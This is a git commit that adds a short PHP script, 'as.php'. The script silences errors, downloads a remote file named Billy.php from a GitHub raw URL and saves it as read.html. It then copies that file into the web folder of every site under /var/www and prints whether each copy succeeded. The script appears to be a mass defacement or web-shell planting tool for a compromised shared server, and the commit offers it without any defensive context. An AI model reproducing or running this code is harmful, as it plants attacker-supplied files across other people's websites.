b1b0602f3eeaf44c9d92ea98d02fe121e858ad43
Sniperxxx <73657570+Sniperxxx@users.noreply.github.com>
2022-02-25 23:27:54 +0700

    Create as.php

---
+++ as.php
@@ -0,0 +1,23 @@
+<?php
+error_reporting(0);
+
+$root = '/var/www';
+$scan = scandir($root);
+
+$nama = 'read.html'; 
+$isi = file_get_contents('https://raw.githubusercontent.com/Sniperxxx/sniper404/main/Billy.php'); 
+
+$bikin = fopen($nama, "w");
+		 fwrite($bikin, $isi);
+		 fclose($bikin);
+
+foreach ( $scan as $a ) {
+	$dir = "$a \n";
+	$gas = $root.'/'.$a.'/web/'.$nama;
+	$cos = "$gas \n";
+	$asu = @copy($nama, $gas);
+	if($asu) {
+		print 'Done! => '.$cos; }
+			else { print 'Failed! => '.$dir; }
+	}
+?>
